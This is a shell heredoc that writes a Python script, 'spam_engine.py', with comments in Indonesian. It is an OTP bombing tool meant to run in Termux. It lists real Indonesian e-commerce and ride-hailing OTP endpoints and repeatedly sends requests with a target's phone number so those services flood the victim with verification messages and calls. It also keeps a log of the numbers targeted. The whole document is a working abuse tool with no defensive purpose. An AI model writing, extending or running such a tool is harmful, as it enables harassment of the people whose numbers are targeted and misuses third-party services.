cat > spam_engine.py << 'EOF'
#!/usr/bin/env python3
import requests
import json
import time
import random
import os
from datetime import datetime

class SpamEngine:
    def __init__(self):
        self.endpoints = self.load_endpoints()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36'
        })
    
    def load_endpoints(self):
        """60+ endpoint dari file asli"""
        return {
            'tokopedia': {
                'url': 'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
                'method': 'POST',
                'payload': lambda n: {'msisdn': n}
            },
            'shopee': {
                'url': 'https://shopee.co.id/api/v4/otp/send_vcode',
                'method': 'POST',
                'payload': lambda n: {'phone': '62' + n[1:], 'force_channel': 'true'}
            },
            'gojek': {
                'url': 'https://api.gojekapi.com/v5/customers',
                'method': 'POST',
                'payload': lambda n: {'phone': '62' + n[1:], 'name': 'Test', 'email': 'test@mail.com'}
            },
            'payfazz': {
                'url': 'https://api.payfazz.com/v2/phoneVerifications',
                'method': 'POST',
                'payload': lambda n: {'phone': '0' + n[1:]}
            },
            'gojek_call': {
                'url': 'https://api.grab.com/grabid/v1/phone/otp',
                'method': 'POST',
                'payload': lambda n: {'method': 'CALL', 'countryCode': 'id', 'phoneNumber': n}
            },
            # Add 55+ lebih dari file asli...
        }
    
    def spam_termux(self, nomor, jumlah, callback=None):
        """Execute spam di Termux"""
        success = 0
        failed = 0
        
        for round_num in range(jumlah):
            for endpoint_name, endpoint in list(self.endpoints.items())[:10]:  # Limit 10 endpoint per round
                try:
                    if endpoint['method'] == 'POST':
                        resp = self.session.post(
                            endpoint['url'],
                            json=endpoint['payload'](nomor),
                            timeout=5
                        )
                    else:
                        resp = self.session.get(
                            endpoint['url'],
                            params=endpoint['payload'](nomor),
                            timeout=5
                        )
                    
                    if resp.status_code in [200, 201, 400]:
                        success += 1
                        status = "✓"
                    else:
                        failed += 1
                        status = "✗"
                    
                    if callback:
                        callback(f"[{status}] {endpoint_name} ({round_num+1}/{jumlah})")
                
                except Exception as e:
                    failed += 1
                    if callback:
                        callback(f"[✗] {endpoint_name}")
            
            # Rate limit
            if round_num < jumlah - 1:
                time.sleep(random.uniform(2, 4))
        
        # Save history
        self.save_history(nomor, jumlah, success)
        
        return {'success': success, 'failed': failed}
    
    def save_history(self, nomor, jumlah, success):
        """Save ke history.json"""
        os.makedirs('logs', exist_ok=True)
        
        try:
            with open('logs/history.json', 'r') as f:
                history = json.load(f)
        except:
            history = []
        
        history.append({
            'nomor': nomor,
            'jumlah': jumlah,
            'success': success,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        
        with open('logs/history.json', 'w') as f:
            json.dump(history[-100:], f, indent=2)  # Keep last 100
EOF
